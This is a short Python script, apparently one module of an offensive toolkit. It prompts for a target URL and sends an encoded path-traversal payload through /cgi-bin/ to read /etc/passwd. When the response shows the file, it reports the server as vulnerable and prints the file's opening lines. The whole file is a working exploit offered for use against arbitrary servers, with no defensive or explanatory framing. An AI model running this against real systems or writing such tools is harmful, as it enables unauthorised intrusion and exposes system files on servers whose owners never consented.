import requests
from colorama import Fore

def run():
    url = input("\n[+] Enter Target URL: ").strip()
    payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    
    try:
        response = requests.get(url + payload)
        if "root:" in response.text:
            print(Fore.GREEN + "[+] Vulnerable! Found /etc/passwd:")
            print(response.text[:200])
        else:
            print(Fore.RED + "[!] Target not vulnerable")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {str(e)}")